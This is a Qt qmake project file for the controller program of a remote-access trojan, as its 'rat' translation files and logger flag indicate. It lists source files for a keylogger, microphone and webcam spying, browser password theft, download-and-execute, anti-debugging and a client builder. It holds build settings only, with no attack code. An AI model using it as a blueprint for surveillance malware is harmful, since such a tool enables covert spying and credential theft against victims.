QT       += core gui multimedia multimediawidgets

greaterThan(QT_MAJOR_VERSION, 4): QT += widgets

CONFIG += c++11

# The following define makes your compiler emit warnings if you use
# any Qt feature that has been marked deprecated (the exact warnings
# depend on your compiler). Please consult the documentation of the
# deprecated API in order to know how to port your code away from it.
DEFINES += QT_DEPRECATED_WARNINGS

include(../vars.pri)
include(../config.pri)

# You can also make your code fail to compile if it uses deprecated APIs.
# In order to do so, uncomment the following line.
# You can also select to disable deprecated APIs only up to a certain version of Qt.
#DEFINES += QT_DISABLE_DEPRECATED_BEFORE=0x060000    # disables all the APIs deprecated before Qt 6.0.0

SOURCES += \
    clientbuildwizard.cpp \
    core/clientsmodel.cpp \
    core/controllerbase.cpp \
    core/filetransferthread.cpp \
    core/screenreciver.cpp \
    core/variantlistmodel.cpp \
    core/variantwrappermodel.cpp \
    dialogs/browseropentabsdialog.cpp \
    dialogs/commandlineinterfacedialog.cpp \
    dialogs/createclientdialog.cpp \
    dialogs/filemanagerdialog.cpp \
    dialogs/filetransferdialog.cpp \
    dialogs/filetransferprogressdialog.cpp \
    dialogs/micspydialog.cpp \
    mainwindow.cpp \
    dialogs/messageboxdialog.cpp \
    dialogs/remotedesktoppropertiesdialog.cpp \
    dialogs/screenshotdialog.cpp \
    dialogs/socksproxydialog.cpp \
    dialogs/startupmanagerdialog.cpp \
    dialogs/systeminfodialog.cpp \
    dialogs/taskmanagerdialog.cpp \
    dialogs/visitwebsitedialog.cpp \
    dialogs/vncdialog.cpp \
    dialogs/webcamviewdialog.cpp \
    global.cpp \
    main.cpp \
    remoteview.cpp \
    dialogs/antidebuggerdialog.cpp \
    dialogs/keyloggerdialog.cpp \
    ui/consolewidget.cpp \
    webserver.cpp \
    settingsdialog.cpp \
    appsettings.cpp \
    dialogs/registrydialog.cpp \
    ui/registryvalueeditordialog.cpp \
    dialogs/browserpasswords.cpp \
    dialogs/downloadandexecdialog.cpp

HEADERS += \
    clientbuildwizard.h \
    core/clientsmodel.h \
    core/controllerbase.h \
    core/filetransferthread.h \
    core/screenreciver.h \
    core/variantlistmodel.h \
    core/variantwrappermodel.h \
    dialogs/browseropentabsdialog.h \
    dialogs/commandlineinterfacedialog.h \
    dialogs/createclientdialog.h \
    dialogs/filemanagerdialog.h \
    dialogs/filetransferdialog.h \
    dialogs/filetransferprogressdialog.h \
    dialogs/micspydialog.h \
    mainwindow.h \
    dialogs/messageboxdialog.h \
    dialogs/remotedesktoppropertiesdialog.h \
    dialogs/screenshotdialog.h \
    dialogs/socksproxydialog.h \
    dialogs/startupmanagerdialog.h \
    dialogs/systeminfodialog.h \
    dialogs/taskmanagerdialog.h \
    dialogs/visitwebsitedialog.h \
    dialogs/vncdialog.h \
    dialogs/webcamviewdialog.h \
    global.h \
    remoteview.h \
    dialogs/antidebuggerdialog.h \
    dialogs/keyloggerdialog.h \
    ui/consolewidget.h \
    webserver.h \
    settingsdialog.h \
    appsettings.h \
    dialogs/registrydialog.h \
    ui/registryvalueeditordialog.h \
    dialogs/browserpasswords.h \
    dialogs/downloadandexecdialog.h


FORMS += \
    clientbuildwizard.ui \
    dialogs/browseropentabsdialog.ui \
    dialogs/commandlineinterfacedialog.ui \
    dialogs/createclientdialog.ui \
    dialogs/filemanagerdialog.ui \
    dialogs/filetransferdialog.ui \
    dialogs/filetransferprogressdialog.ui \
    dialogs/keyloggerdialog.ui \
    dialogs/micspydialog.ui \
    mainwindow.ui \
    dialogs/messageboxdialog.ui \
    dialogs/remotedesktoppropertiesdialog.ui \
    dialogs/screenshotdialog.ui \
    dialogs/socksproxydialog.ui \
    dialogs/startupmanagerdialog.ui \
    dialogs/systeminfodialog.ui \
    dialogs/taskmanagerdialog.ui \
    dialogs/visitwebsitedialog.ui \
    dialogs/vncdialog.ui \
    dialogs/webcamviewdialog.ui \
    dialogs/antidebuggerdialog.ui \
    settingsdialog.ui \
    dialogs/registrydialog.ui \
    ui/registryvalueeditordialog.ui \
    dialogs/browserpasswords.ui \
    dialogs/downloadandexecdialog.ui

defined(DDD) {
    HEADERS += \
        client_maker_wizard/clientmakerwizard.h \
        client_maker_wizard/wizardpageappname.h \
        client_maker_wizard/wizardpageconnection.h \
        client_maker_wizard/wizardpagemessagebox.h \
        client_maker_wizard/wizardpageoutputpath.h \
        client_maker_wizard/wizardpageselectplatform.h \

    SOURCES += \
        client_maker_wizard/clientmakerwizard.cpp \
        client_maker_wizard/wizardpageappname.cpp \
        client_maker_wizard/wizardpageconnection.cpp \
        client_maker_wizard/wizardpagemessagebox.cpp \
        client_maker_wizard/wizardpageoutputpath.cpp \
        client_maker_wizard/wizardpageselectplatform.cpp \

    FORMS += \
        client_maker_wizard/wizardpageappname.ui \
        client_maker_wizard/wizardpageconnection.ui \
        client_maker_wizard/wizardpagemessagebox.ui \
        client_maker_wizard/wizardpageoutputpath.ui \
        client_maker_wizard/wizardpageselectplatform.ui \
}

INCLUDEPATH += $$PWD/../3rdparty/qlibvncclient/src/
# Default rules for deployment.
qnx: target.path = /tmp/$${TARGET}/bin
else: unix:!android: target.path = /opt/$${TARGET}/bin
!isEmpty(target.path): INSTALLS += target

include(../3rdparty/neuron/neuron_server.pri)
#include(../3rdparty/QtConsole/qtconsole.pri)
include(../common/common.pri)
#include(../3rdparty/QHttpServer/qthttpserver.pri)
include(../3rdparty/QHexEdit.pri)
equals(RAT_SERVER_LOGGER, 1) {
    include(../3rdparty/Logger/logger.pri)
}
include(../3rdparty/SocksLib/SocksLib-server.pri)

RESOURCES += \
    res/icons/icons.qrc \
    res/res.qrc


TRANSLATIONS = translations/rat_en.ts \
               translations/rat_fa.ts

DISTFILES += \
    res/themes/dark.css \
    res/themes/dark_style.css \
    res/themes/default.css \
    res/themes/dracula.css \
    res/themes/fusion.css \
    res/themes/material-blue.css \
    res/themes/modern.css \
    res/themes/web.css

CONFIG(release, debug|release): DESTDIR += $$PWD/../output/$$PLATFORM/

STATECHARTS += \
    ClientMakerWizardStates.scxml
